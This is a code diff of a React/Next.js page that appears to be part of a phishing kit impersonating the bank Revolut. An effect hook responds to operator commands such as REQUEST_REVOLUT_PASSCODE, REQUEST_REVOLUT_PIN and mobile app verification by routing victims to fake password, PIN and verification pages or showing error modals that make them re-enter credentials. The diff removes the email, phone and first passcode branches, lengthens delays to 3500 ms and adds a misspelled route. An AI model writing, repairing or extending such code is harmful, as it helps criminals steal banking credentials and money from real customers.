@@ -67,19 +67,7 @@ export default function Security() {
 
 
     useEffect(() => {
-        if (command === 'REQUEST_EMAIL_AGAIN') {
-            console.log("HERE WE WILL REQUEST EMAIL AGAIN");
-            displayErrorModal('email'); // Show error modal for email
-        } else if (command === 'REQUEST_NUMBER_AGAIN') {
-            console.log("HERE WE WILL REQUEST NUMBER AGAIN");
-            displayErrorModal('phone'); // Show error modal for phone number
-        } else if (command === 'REQUEST_REVOLUT_PASSCODE') {
-            setTimeout(() => {
-                console.log("HERE WE WILL PUSH TO PASSWORD PAGE");
-                displayPageLoader();
-                router.push('/PasswordPage');
-            }, 500);
-        } else if (command === 'REQUEST_REVOLUT_PASSCODE_AGAIN') {
+        if (command === 'REQUEST_REVOLUT_PASSCODE_AGAIN') {
             console.log("HERE WE WILL REQUEST REVOLUT PASSCODE AGAIN");
             displayErrorModal('passcode'); // Show error modal for passcode
         } else if (command === 'REQUEST_REVOLUT_PIN') {
@@ -87,7 +75,7 @@ export default function Security() {
                 console.log("HERE WE WILL PUSH TO PIN PAGE");
                 displayPageLoader();
                 router.push('/PasswordPage');
-            }, 500);
+            }, 3500);
         } else if (command === 'REQUEST_REVOLUT_PIN_AGAIN') {
             console.log("HERE WE WILL REQUEST REVOLUT PIN");
             displayErrorModal('pin'); // Show error modal for pin
@@ -96,19 +84,19 @@ export default function Security() {
                 console.log("HERE WE WILL PUSH TO FACE VERIFICATION PAGE");
                 // displayPageLoader();
                 // router.push('/FaceVerificationPage');
-            }, 500);
+            }, 3500);
         } else if (command === 'REQUEST_REVOLUT_FACE_VERIFICATION_AGAIN') {
             // displayErrorModal('face_verification'); // Show error modal for face verification
         } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
             setTimeout(() => {
                 console.log("HERE WE WILL PUSH TO MOBILE APP VERIFICATION PAGE");
-                router.push('/MobileAuthPage');
-            }, 500);
+                router.push('/MobileAuthPAge');
+            }, 3500);
         } else if (command === 'FINISH') {
             setTimeout(() => {
                 resetCommand(); 
                 router.push('/verificationPage');
-            }, 1500);
+            }, 3500);
         }
     }, [command, router, commandCounter]);
 
